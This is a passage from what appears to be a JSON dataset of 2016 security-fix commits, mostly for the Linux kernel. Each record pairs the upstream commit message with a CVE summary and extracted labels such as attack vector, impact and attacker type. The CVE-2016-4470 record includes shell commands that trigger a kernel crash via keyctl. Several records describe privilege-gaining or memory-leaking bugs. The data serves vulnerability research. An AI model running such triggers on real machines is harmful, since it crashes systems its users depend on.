 >] net_alloc kernel\/net\/core\/net_namespace.c:325\n[<      none      >] copy_net_ns+0x6b\/0x1a0 kernel\/net\/core\/net_namespace.c:360\n[<      none      >] create_new_namespaces+0x2f6\/0x610 kernel\/kernel\/nsproxy.c:95\n[<      none      >] copy_namespaces+0x297\/0x320 kernel\/kernel\/nsproxy.c:150\n[<      none      >] copy_process.part.35+0x1bf4\/0x5760 kernel\/kernel\/fork.c:1451\n[<     inline     >] copy_process kernel\/kernel\/fork.c:1274\n[<      none      >] _do_fork+0x1bc\/0xcb0 kernel\/kernel\/fork.c:1723\n[<     inline     >] SYSC_clone kernel\/kernel\/fork.c:1832\n[<      none      >] SyS_clone+0x37\/0x50 kernel\/kernel\/fork.c:1826\n[<      none      >] entry_SYSCALL_64_fastpath+0x16\/0x7a kernel\/arch\/x86\/entry\/entry_64.S:185\n\nINFO: Freed in net_drop_ns+0x67\/0x80 age=575 cpu=2 pid=2631\n[<      none      >] __slab_free+0x1fc\/0x320 kernel\/mm\/slub.c:2650\n[<     inline     >] slab_free kernel\/mm\/slub.c:2805\n[<      none      >] kmem_cache_free+0x2a0\/0x330 kernel\/mm\/slub.c:2814\n[<     inline     >] net_free kernel\/net\/core\/net_namespace.c:341\n[<      none      >] net_drop_ns+0x67\/0x80 kernel\/net\/core\/net_namespace.c:348\n[<      none      >] cleanup_net+0x4e5\/0x600 kernel\/net\/core\/net_namespace.c:448\n[<      none      >] process_one_work+0x794\/0x1440 kernel\/kernel\/workqueue.c:2036\n[<      none      >] worker_thread+0xdb\/0xfc0 kernel\/kernel\/workqueue.c:2170\n[<      none      >] kthread+0x23f\/0x2d0 kernel\/drivers\/block\/aoe\/aoecmd.c:1303\n[<      none      >] ret_from_fork+0x3f\/0x70 kernel\/arch\/x86\/entry\/entry_64.S:468\nINFO: Slab 0xffffea0001938800 objects=3 used=0 fp=0xffff880064e20000\nflags=0x5fffc0000004080\nINFO: Object 0xffff880064e20000 @offset=0 fp=0xffff880064e24200\n\nCPU: 1 PID: 11581 Comm: syz-executor Tainted: G    B           4.4.0+\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS\nrel-1.8.2-0-g33fbe13 by qemu-project.org 04\/01\/2014\n 00000000ffffffff ffff8800662c7790 ffffffff8292049d ffff88003e36a300\n ffff880064e20000 ffff880064e20000 ffff8800662c77c0 ffffffff816f2054\n ffff88003e36a300 ffffea0001938800 ffff880064e20000 0000000000000000\nCall Trace:\n [<     inline     >] __dump_stack kernel\/lib\/dump_stack.c:15\n [<ffffffff8292049d>] dump_stack+0x6f\/0xa2 kernel\/lib\/dump_stack.c:50\n [<ffffffff816f2054>] print_trailer+0xf4\/0x150 kernel\/mm\/slub.c:654\n [<ffffffff816f875f>] object_err+0x2f\/0x40 kernel\/mm\/slub.c:661\n [<     inline     >] print_address_description kernel\/mm\/kasan\/report.c:138\n [<ffffffff816fb0c5>] kasan_report_error+0x215\/0x530 kernel\/mm\/kasan\/report.c:236\n [<     inline     >] kasan_report kernel\/mm\/kasan\/report.c:259\n [<ffffffff816fb4de>] __asan_report_load8_noabort+0x3e\/0x40 kernel\/mm\/kasan\/report.c:280\n [<     inline     >] ? ppp_pernet kernel\/include\/linux\/compiler.h:218\n [<ffffffff83ad71b2>] ? ppp_unregister_channel+0x372\/0x3a0 kernel\/drivers\/net\/ppp\/ppp_generic.c:2392\n [<     inline     >] ppp_pernet kernel\/include\/linux\/compiler.h:218\n [<ffffffff83ad71b2>] ppp_unregister_channel+0x372\/0x3a0 kernel\/drivers\/net\/ppp\/ppp_generic.c:2392\n [<     inline     >] ? ppp_pernet kernel\/drivers\/net\/ppp\/ppp_generic.c:293\n [<ffffffff83ad6f26>] ? ppp_unregister_channel+0xe6\/0x3a0 kernel\/drivers\/net\/ppp\/ppp_generic.c:2392\n [<ffffffff83ae18f3>] ppp_asynctty_close+0xa3\/0x130 kernel\/drivers\/net\/ppp\/ppp_async.c:241\n [<ffffffff83ae1850>] ? async_lcp_peek+0x5b0\/0x5b0 kernel\/drivers\/net\/ppp\/ppp_async.c:1000\n [<ffffffff82c33239>] tty_ldisc_close.isra.1+0x99\/0xe0 kernel\/drivers\/tty\/tty_ldisc.c:478\n [<ffffffff82c332c0>] tty_ldisc_kill+0x40\/0x170 kernel\/drivers\/tty\/tty_ldisc.c:744\n [<ffffffff82c34943>] tty_ldisc_release+0x1b3\/0x260 kernel\/drivers\/tty\/tty_ldisc.c:772\n [<ffffffff82c1ef21>] tty_release+0xac1\/0x13e0 kernel\/drivers\/tty\/tty_io.c:1901\n [<ffffffff82c1e460>] ? release_tty+0x320\/0x320 kernel\/drivers\/tty\/tty_io.c:1688\n [<ffffffff8174de36>] __fput+0x236\/0x780 kernel\/fs\/file_table.c:208\n [<ffffffff8174e405>] ____fput+0x15\/0x20 kernel\/fs\/file_table.c:244\n [<ffffffff813595ab>] task_work_run+0x16b\/0x200 kernel\/kernel\/task_work.c:115\n [<     inline     >] exit_task_work kernel\/include\/linux\/task_work.h:21\n [<ffffffff81307105>] do_exit+0x8b5\/0x2c60 kernel\/kernel\/exit.c:750\n [<ffffffff813fdd20>] ? debug_check_no_locks_freed+0x290\/0x290 kernel\/kernel\/locking\/lockdep.c:4123\n [<ffffffff81306850>] ? mm_update_next_owner+0x6f0\/0x6f0 kernel\/kernel\/exit.c:357\n [<ffffffff813215e6>] ? __dequeue_signal+0x136\/0x470 kernel\/kernel\/signal.c:550\n [<ffffffff8132067b>] ? recalc_sigpending_tsk+0x13b\/0x180 kernel\/kernel\/signal.c:145\n [<ffffffff81309628>] do_group_exit+0x108\/0x330 kernel\/kernel\/exit.c:880\n [<ffffffff8132b9d4>] get_signal+0x5e4\/0x14f0 kernel\/kernel\/signal.c:2307\n [<     inline     >] ? kretprobe_table_lock kernel\/kernel\/kprobes.c:1113\n [<ffffffff8151d355>] ? kprobe_flush_task+0xb5\/0x450 kernel\/kernel\/kprobes.c:1158\n [<ffffffff8115f7d3>] do_signal+0x83\/0x1c90 kernel\/arch\/x86\/kernel\/signal.c:712\n [<ffffffff8151d2a0>] ? recycle_rp_inst+0x310\/0x310 kernel\/include\/linux\/list.h:655\n [<ffffffff8115f750>] ? setup_sigcontext+0x780\/0x780 kernel\/arch\/x86\/kernel\/signal.c:165\n [<ffffffff81380864>] ? finish_task_switch+0x424\/0x5f0 kernel\/kernel\/sched\/core.c:2692\n [<     inline     >] ? finish_lock_switch kernel\/kernel\/sched\/sched.h:1099\n [<ffffffff81380560>] ? finish_task_switch+0x120\/0x5f0 kernel\/kernel\/sched\/core.c:2678\n [<     inline     >] ? context_switch kernel\/kernel\/sched\/core.c:2807\n [<ffffffff85d794e9>] ? __schedule+0x919\/0x1bd0 kernel\/kernel\/sched\/core.c:3283\n [<ffffffff81003901>] exit_to_usermode_loop+0xf1\/0x1a0 kernel\/arch\/x86\/entry\/common.c:247\n [<     inline     >] prepare_exit_to_usermode kernel\/arch\/x86\/entry\/common.c:282\n [<ffffffff810062ef>] syscall_return_slowpath+0x19f\/0x210 kernel\/arch\/x86\/entry\/common.c:344\n [<ffffffff85d88022>] int_ret_from_sys_call+0x25\/0x9f kernel\/arch\/x86\/entry\/entry_64.S:281\nMemory state around the buggy address:\n ffff880064e21680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff880064e21700: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n>ffff880064e21780: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n                                                       ^\n ffff880064e21800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff880064e21880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n==================================================================\n\nFixes: 273ec51dd7ce (\"net: ppp_generic - introduce net-namespace functionality v2\")\nReported-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Guillaume Nault <g.nault@alphalink.fr>\nReviewed-by: Cyrill Gorcunov <gorcunov@openvz.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Use-after-free vulnerability in drivers\/net\/ppp\/ppp_generic.c in the Linux kernel before 4.5.2 allows local users to cause a denial of service (memory corruption and system crash, or spinlock) or possibly have unspecified other impact by removing a network namespace, related to the ppp_register_net_channel and ppp_unregister_channel functions.","commit_message_1":"take reference on channel netns let channel hold a reference on their network namespace","Vulnerability Type":"Use After Free","Attack Vector":"by removing a network namespace , related to the ppp _ register _ net _ channel and ppp _ unregister _ channel functions","Impact":"cause a denial of service ( memory corruption and system crash , or spinlock ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"e8eff147e9da1185f9afd5b25948153a3b97cf52","cve_id":"CVE-2016-4804","cwe_id":"CWE-119","commit_message":"read_boot(): Handle excessive FAT size specifications\n\nThe variable used for storing the FAT size (in bytes) was an unsigned\nint. Since the size in sectors read from the BPB was not sufficiently\nchecked, this could end up being zero after multiplying it with the\nsector size while some offsets still stayed excessive. Ultimately it\nwould cause segfaults when accessing FAT entries for which no memory\nwas allocated.\n\nMake it more robust by changing the types used to store FAT size to\noff_t and abort if there is no room for data clusters. Additionally\ncheck that FAT size is not specified as zero.\n\nFixes #25 and fixes #26.\n\nReported-by: Hanno B\u00f6ck\nSigned-off-by: Andreas Bombe <aeb@debian.org>","summary":"The read_boot function in boot.c in dosfstools before 4.0 allows attackers to cause a denial of service (crash) via a crafted filesystem, which triggers a heap-based buffer overflow in the (1) read_fat function or an out-of-bounds heap read in (2) get_fat function.","commit_message_1":"handle excessive fat size specification the variable used for storing the fat size ( in byte ) wa an unsigned int","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted filesystem , which triggers a heap - based buffer overflow in the ( 1 ) read _ fat function or an out - of - bounds heap read in ( 2 ) get _ fat function","Impact":"cause a denial of service ( crash )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"5ec0811d30378ae104f250bfc9b3640242d81e3f","cve_id":"CVE-2016-4581","cwe_id":null,"commit_message":"propogate_mnt: Handle the first propogated copy being a slave\n\nWhen the first propgated copy was a slave the following oops would result:\n> BUG: unable to handle kernel NULL pointer dereference at 0000000000000010\n> IP: [<ffffffff811fba4e>] propagate_one+0xbe\/0x1c0\n> PGD bacd4067 PUD bac66067 PMD 0\n> Oops: 0000 [#1] SMP\n> Modules linked in:\n> CPU: 1 PID: 824 Comm: mount Not tainted 4.6.0-rc5userns+ #1523\n> Hardware name: Bochs Bochs, BIOS Bochs 01\/01\/2007\n> task: ffff8800bb0a8000 ti: ffff8800bac3c000 task.ti: ffff8800bac3c000\n> RIP: 0010:[<ffffffff811fba4e>]  [<ffffffff811fba4e>] propagate_one+0xbe\/0x1c0\n> RSP: 0018:ffff8800bac3fd38  EFLAGS: 00010283\n> RAX: 0000000000000000 RBX: ffff8800bb77ec00 RCX: 0000000000000010\n> RDX: 0000000000000000 RSI: ffff8800bb58c000 RDI: ffff8800bb58c480\n> RBP: ffff8800bac3fd48 R08: 0000000000000001 R09: 0000000000000000\n> R10: 0000000000001ca1 R11: 0000000000001c9d R12: 0000000000000000\n> R13: ffff8800ba713800 R14: ffff8800bac3fda0 R15: ffff8800bb77ec00\n> FS:  00007f3c0cd9b7e0(0000) GS:ffff8800bfb00000(0000) knlGS:0000000000000000\n> CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\n> CR2: 0000000000000010 CR3: 00000000bb79d000 CR4: 00000000000006e0\n> Stack:\n>  ffff8800bb77ec00 0000000000000000 ffff8800bac3fd88 ffffffff811fbf85\n>  ffff8800bac3fd98 ffff8800bb77f080 ffff8800ba713800 ffff8800bb262b40\n>  0000000000000000 0000000000000000 ffff8800bac3fdd8 ffffffff811f1da0\n> Call Trace:\n>  [<ffffffff811fbf85>] propagate_mnt+0x105\/0x140\n>  [<ffffffff811f1da0>] attach_recursive_mnt+0x120\/0x1e0\n>  [<ffffffff811f1ec3>] graft_tree+0x63\/0x70\n>  [<ffffffff811f1f6b>] do_add_mount+0x9b\/0x100\n>  [<ffffffff811f2c1a>] do_mount+0x2aa\/0xdf0\n>  [<ffffffff8117efbe>] ? strndup_user+0x4e\/0x70\n>  [<ffffffff811f3a45>] SyS_mount+0x75\/0xc0\n>  [<ffffffff8100242b>] do_syscall_64+0x4b\/0xa0\n>  [<ffffffff81988f3c>] entry_SYSCALL64_slow_path+0x25\/0x25\n> Code: 00 00 75 ec 48 89 0d 02 22 22 01 8b 89 10 01 00 00 48 89 05 fd 21 22 01 39 8e 10 01 00 00 0f 84 e0 00 00 00 48 8b 80 d8 00 00 00 <48> 8b 50 10 48 89 05 df 21 22 01 48 89 15 d0 21 22 01 8b 53 30\n> RIP  [<ffffffff811fba4e>] propagate_one+0xbe\/0x1c0\n>  RSP <ffff8800bac3fd38>\n> CR2: 0000000000000010\n> ---[ end trace 2725ecd95164f217 ]---\n\nThis oops happens with the namespace_sem held and can be triggered by\nnon-root users.  An all around not pleasant experience.\n\nTo avoid this scenario when finding the appropriate source mount to\ncopy stop the walk up the mnt_master chain when the first source mount\nis encountered.\n\nFurther rewrite the walk up the last_source mnt_master chain so that\nit is clear what is going on.\n\nThe reason why the first source mount is special is that it it's\nmnt_parent is not a mount in the dest_mnt propagation tree, and as\nsuch termination conditions based up on the dest_mnt mount propgation\ntree do not make sense.\n\nTo avoid other kinds of confusion last_dest is not changed when\ncomputing last_source.  last_dest is only used once in propagate_one\nand that is above the point of the code being modified, so changing\nthe global variable is meaningless and confusing.\n\nCc: stable@vger.kernel.org\nfixes: f2ebb3a921c1ca1e2ddd9242e95a1989a50c4c68 (\"smarter propagate_mnt()\")\nReported-by: Tycho Andersen <tycho.andersen@canonical.com>\nReviewed-by: Seth Forshee <seth.forshee@canonical.com>\nTested-by: Seth Forshee <seth.forshee@canonical.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"fs\/pnode.c in the Linux kernel before 4.5.4 does not properly traverse a mount propagation tree in a certain case involving a slave mount, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) via a crafted series of mount system calls.","commit_message_1":"handle the first propogated copy being a slave when the first propgated copy wa a slave the following oops would result : > bug : unable to handle kernel null pointer dereference at <number> > ip : [ < ffffffff811fba4e > ] propagate_one+0xbe\/0x1c0 > pgd bacd4067 pud bac66067 pmd <number> > oops : <number> [ # <number> ] smp > module linked in : > cpu : <number> pid : <number> comm : mount not tainted <file>","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted series of mount system calls","Impact":"cause a denial of service ( pointer dereference and oops )","Root Cause":"does not properly traverse a mount propagation tree","Attack Type":"local attacker"},{"commit_id":"79e48650320e6fba48369fccf13fd045315b19b8","cve_id":"CVE-2016-4580","cwe_id":"CWE-200","commit_message":"net: fix a kernel infoleak in x25 module\n\nStack object \"dte_facilities\" is allocated in x25_rx_call_request(),\nwhich is supposed to be initialized in x25_negotiate_facilities.\nHowever, 5 fields (8 bytes in total) are not initialized. This\nobject is then copied to userland via copy_to_user, thus infoleak\noccurs.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The x25_negotiate_facilities function in net\/x25\/x25_facilities.c in the Linux kernel before 4.5.5 does not properly initialize a certain data structure, which allows attackers to obtain sensitive information from kernel stack memory via an X.25 Call Request.","commit_message_1":"fix a kernel infoleak in x25 module stack object `` dte_facilities '' is allocated in x25_rx_call_request ( ) , which is supposed to be initialized in x25_negotiate_facilities","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via an x . 25 call request","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not properly initialize a certain data structure","Attack Type":"remote attacker"},{"commit_id":"e4ec8cc8039a7063e24204299b462bd1383184a5","cve_id":"CVE-2016-4578","cwe_id":"CWE-200","commit_message":"ALSA: timer: Fix leak in events via snd_timer_user_tinterrupt\n\nThe stack object \u201cr1\u201d has a total size of 32 bytes. Its field\n\u201cevent\u201d and \u201cval\u201d both contain 4 bytes padding. These 8 bytes\npadding bytes are sent to user without being initialized.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel through 4.6 does not initialize certain r1 data structures, which allows local users to obtain sensitive information from kernel stack memory via crafted use of the ALSA timer interface, related to the (1) snd_timer_user_ccallback and (2) snd_timer_user_tinterrupt functions.","commit_message_1":"timer : fix leak in event via snd_timer_user_tinterrupt the stack object \u201c r1 \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted use of the alsa timer interface , related to the ( 1 ) snd _ timer _ user _ ccallback and ( 2 ) snd _ timer _ user _ tinterrupt functions","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain r1 data structures ","Attack Type":"local attacker"},{"commit_id":"cec8f96e49d9be372fdb0c3836dcf31ec71e457e","cve_id":"CVE-2016-4569","cwe_id":"CWE-200","commit_message":"ALSA: timer: Fix leak in SNDRV_TIMER_IOCTL_PARAMS\n\nThe stack object \u201ctread\u201d has a total size of 32 bytes. Its field\n\u201cevent\u201d and \u201cval\u201d both contain 4 bytes padding. These 8 bytes\npadding bytes are sent to user without being initialized.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"The snd_timer_user_params function in sound\/core\/timer.c in the Linux kernel through 4.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via crafted use of the ALSA timer interface.","commit_message_1":"timer : fix leak in sndrv_timer_ioctl_params the stack object \u201c tread \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted use of the alsa timer interface","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"2c1f6951a8a82e6de0d82b1158b5e493fc6c54ab","cve_id":"CVE-2016-4568","cwe_id":"CWE-119","commit_message":"[media] videobuf2-v4l2: Verify planes array in buffer dequeueing\n\nWhen a buffer is being dequeued using VIDIOC_DQBUF IOCTL, the exact buffer\nwhich will be dequeued is not known until the buffer has been removed from\nthe queue. The number of planes is specific to a buffer, not to the queue.\n\nThis does lead to the situation where multi-plane buffers may be requested\nand queued with n planes, but VIDIOC_DQBUF IOCTL may be passed an argument\nstruct with fewer planes.\n\n__fill_v4l2_buffer() however uses the number of planes from the dequeued\nvideobuf2 buffer, overwriting kernel memory (the m.planes array allocated\nin video_usercopy() in v4l2-ioctl.c)  if the user provided fewer\nplanes than the dequeued buffer had. Oops!\n\nFixes: b0e0e1f83de3 (\"[media] media: videobuf2: Prepare to divide videobuf2\")\n\nSigned-off-by: Sakari Ailus <sakari.ailus@linux.intel.com>\nAcked-by: Hans Verkuil <hans.verkuil@cisco.com>\nCc: stable@vger.kernel.org # for v4.4 and later\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>","summary":"drivers\/media\/v4l2-core\/videobuf2-v4l2.c in the Linux kernel before 4.5.3 allows local users to cause a denial of service (kernel memory write operation) or possibly have unspecified other impact via a crafted number of planes in a VIDIOC_DQBUF ioctl call.","commit_message_1":"verify plane array in buffer dequeueing when a buffer is being dequeued using vidioc_dqbuf ioctl , the exact buffer which will be dequeued is not known until the buffer ha been removed from the queue","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted number of planes in a vidioc _ dqbuf ioctl call","Impact":"cause a denial of service ( kernel memory write operation ) or possibly have unspecified other impact","Root Cause":"caused by the use of the number of planes from the dequeued videobuf2 buffer by __fill_v4l2_buffer()","Attack Type":"local attacker"},{"commit_id":"e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3","cve_id":"CVE-2016-4565","cwe_id":"CWE-264","commit_message":"IB\/security: Restrict use of the write() interface\n\nThe drivers\/infiniband stack uses write() as a replacement for\nbi-directional ioctl().  This is not safe. There are ways to\ntrigger write calls that result in the return structure that\nis normally written to user space being shunted off to user\nspecified kernel memory instead.\n\nFor the immediate repair, detect and deny suspicious accesses to\nthe write API.\n\nFor long term, update the user space libraries and the kernel API\nto something that doesn't present the same security vulnerabilities\n(likely a structured ioctl() interface).\n\nThe impacted uAPI interfaces are generally only available if\nhardware from drivers\/infiniband is installed in the system.\n\nReported-by: Jann Horn <jann@thejh.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\n[ Expanded check to all known write() entry points ]\nCc: stable@vger.kernel.org\nSigned-off-by: Doug Ledford <dledford@redhat.com>","summary":"The InfiniBand (aka IB) stack in the Linux kernel before 4.5.3 incorrectly relies on the write system call, which allows local users to cause a denial of service (kernel memory write operation) or possibly have unspecified other impact via a uAPI interface.","commit_message_1":"restrict use of the write ( ) interface the drivers\/infiniband stack us write ( ) a a replacement for bi-directional ioctl ( )","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a uapi interface","Impact":"cause a denial of service ( kernel memory write operation ) or possibly have unspecified other impact","Root Cause":"incorrectly relies on the write system call","Attack Type":"local attacker"},{"commit_id":"726812fa2fa7ce16bcf58f6e115f65427a1c0950","cve_id":"CVE-2016-4564","cwe_id":"CWE-119","commit_message":"Prevent buffer overflow in magick\/draw.c","summary":"The DrawImage function in MagickCore\/draw.c in ImageMagick before 6.9.4-0 and 7.x before 7.0.1-2 makes an incorrect function call in attempting to locate the next token, which allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"prevent buffer overflow in magick\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"makes an incorrect function call","Attack Type":"remote attacker"},{"commit_id":"92117d8443bc5afacc8d5ba82e541946310f106e","cve_id":"CVE-2016-4558","cwe_id":null,"commit_message":"bpf: fix refcnt overflow\n\nOn a system with >32Gbyte of phyiscal memory and infinite RLIMIT_MEMLOCK,\nthe malicious application may overflow 32-bit bpf program refcnt.\nIt's also possible to overflow map refcnt on 1Tb system.\nImpose 32k hard limit which means that the same bpf program or\nmap cannot be shared by more than 32k processes.\n\nFixes: 1be7f75d1668 (\"bpf: enable non-root eBPF programs\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\nAcked-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The BPF subsystem in the Linux kernel before 4.5.5 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted application on (1) a system with more than 32 Gb of memory, related to the program reference count or (2) a 1 Tb system, related to the map reference count.","commit_message_1":"fix refcnt overflow on a system with > 32gbyte of phyiscal memory and infinite rlimit_memlock , the malicious application may overflow <number>-bit bpf program refcnt","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted application on ( 1 ) a system with more than 32 gb of memory , related to the program reference count or ( 2 ) a 1 tb system , related to the map reference count .","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by a use-after-free","Attack Type":"local attacker"},{"commit_id":"8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7","cve_id":"CVE-2016-4557","cwe_id":null,"commit_message":"bpf: fix double-fdput in replace_map_fd_with_map_ptr()\n\nWhen bpf(BPF_PROG_LOAD, ...) was invoked with a BPF program whose bytecode\nreferences a non-map file descriptor as a map file descriptor, the error\nhandling code called fdput() twice instead of once (in __bpf_map_get() and\nin replace_map_fd_with_map_ptr()). If the file descriptor table of the\ncurrent task is shared, this causes f_count to be decremented too much,\nallowing the struct file to be freed while it is still in use\n(use-after-free). This can be exploited to gain root privileges by an\nunprivileged user.\n\nThis bug was introduced in\ncommit 0246e64d9a5f (\"bpf: handle pseudo BPF_LD_IMM64 insn\"), but is only\nexploitable since\ncommit 1be7f75d1668 (\"bpf: enable non-root eBPF programs\") because\npreviously, CAP_SYS_ADMIN was required to reach the vulnerable code.\n\n(posted publicly according to request by maintainer)\n\nSigned-off-by: Jann Horn <jannh@google.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nAcked-by: Daniel Borkmann <daniel@iogearbox.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The replace_map_fd_with_map_ptr function in kernel\/bpf\/verifier.c in the Linux kernel before 4.5.5 does not properly maintain an fd data structure, which allows local users to gain privileges or cause a denial of service (use-after-free) via crafted BPF instructions that reference an incorrect file descriptor.","commit_message_1":"fix double-fdput in replace_map_fd_with_map_ptr ( ) when bpf ( bpf_prog_load ,","Vulnerability Type":"use - after - free","Attack Vector":"via crafted bpf instructions that reference an incorrect file descriptor","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"does not properly maintain an fd data structure","Attack Type":"local attacker"},{"commit_id":"5f8e44741f9f216e33736ea4ec65ca9ac03036e6","cve_id":"CVE-2016-4486","cwe_id":"CWE-200","commit_message":"net: fix infoleak in rtnetlink\n\nThe stack object \u201cmap\u201d has a total size of 32 bytes. Its last 4\nbytes are padding generated by compiler. These padding bytes are\nnot initialized and sent out via \u201cnla_put\u201d.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rtnl_fill_link_ifmap function in net\/core\/rtnetlink.c in the Linux kernel before 4.5.5 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory by reading a Netlink message.","commit_message_1":"fix infoleak in rtnetlink the stack object \u201c map \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a netlink message","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"b8670c09f37bdf2847cc44f36511a53afc6161fd","cve_id":"CVE-2016-4485","cwe_id":"CWE-200","commit_message":"net: fix infoleak in llc\n\nThe stack object \u201cinfo\u201d has a total size of 12 bytes. Its last byte\nis padding which is not initialized and leaked via \u201cput_cmsg\u201d.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The llc_cmsg_rcv function in net\/llc\/af_llc.c in the Linux kernel before 4.5.5 does not initialize a certain data structure, which allows attackers to obtain sensitive information from kernel stack memory by reading a message.","commit_message_1":"fix infoleak in llc the stack object \u201c info \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by reading a message","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"681fef8380eb818c0b845fca5d2ab1dcbab114ee","cve_id":"CVE-2016-4482","cwe_id":"CWE-200","commit_message":"USB: usbfs: fix potential infoleak in devio\n\nThe stack object \u201cci\u201d has a total size of 8 bytes. Its last 3 bytes\nare padding bytes which are not initialized and leaked to userland\nvia \u201ccopy_to_user\u201d.\n\nSigned-off-by: Kangjie Lu <kjlu@gatech.edu>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The proc_connectinfo function in drivers\/usb\/core\/devio.c in the Linux kernel through 4.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted USBDEVFS_CONNECTINFO ioctl call.","commit_message_1":"usbfs : fix potential infoleak in devio the stack object \u201c ci \u201d ha a total size of <number> byte","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted usbdevfs _ connectinfo ioctl call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"87580d767868360d2fed503980129504da84b63e","cve_id":"CVE-2016-4478","cwe_id":"CWE-119","commit_message":"Do not copy more bytes than were allocated","summary":"Buffer overflow in the xmlrpc_char_encode function in modules\/transport\/xmlrpc\/xmlrpclib.c in Atheme before 7.2.7 allows remote attackers to cause a denial of service via vectors related to XMLRPC response encoding.","commit_message_1":"do not copy more byte than were allocated","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to xmlrpc response encoding","Impact":"cause a denial of service","Root Cause":"caused by the failure to restrict the size of XMLRPC response","Attack Type":"remote attacker"},{"commit_id":"38327424b40bcebe2de92d07312c89360ac9229a","cve_id":"CVE-2016-4470","cwe_id":null,"commit_message":"KEYS: potential uninitialized variable\n\nIf __key_link_begin() failed then \"edit\" would be uninitialized.  I've\nadded a check to fix that.\n\nThis allows a random user to crash the kernel, though it's quite\ndifficult to achieve.  There are three ways it can be done as the user\nwould have to cause an error to occur in __key_link():\n\n (1) Cause the kernel to run out of memory.  In practice, this is difficult\n     to achieve without ENOMEM cropping up elsewhere and aborting the\n     attempt.\n\n (2) Revoke the destination keyring between the keyring ID being looked up\n     and it being tested for revocation.  In practice, this is difficult to\n     time correctly because the KEYCTL_REJECT function can only be used\n     from the request-key upcall process.  Further, users can only make use\n     of what's in \/sbin\/request-key.conf, though this does including a\n     rejection debugging test - which means that the destination keyring\n     has to be the caller's session keyring in practice.\n\n (3) Have just enough key quota available to create a key, a new session\n     keyring for the upcall and a link in the session keyring, but not then\n     sufficient quota to create a link in the nominated destination keyring\n     so that it fails with EDQUOT.\n\nThe bug can be triggered using option (3) above using something like the\nfollowing:\n\n\techo 80 >\/proc\/sys\/kernel\/keys\/root_maxbytes\n\tkeyctl request2 user debug:fred negate @t\n\nThe above sets the quota to something much lower (80) to make the bug\neasier to 